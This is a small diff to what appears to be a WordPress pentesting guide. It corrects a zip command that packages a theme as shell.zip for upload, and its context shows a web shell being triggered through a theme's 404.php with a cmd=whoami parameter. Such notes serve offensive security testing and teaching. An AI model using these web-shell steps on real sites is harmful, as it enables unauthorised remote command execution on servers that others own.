@@ -31,7 +31,7 @@ http://target.com/wp-content/themes/[theme]/404.php?cmd=whoami
 4. Zip the theme:
 
 ```php
-zip shell.zip <Theme_folder>
+zip -r shell.zip <Theme_folder>
 ```
 
 5. Upload the Theme `shell.zip`.
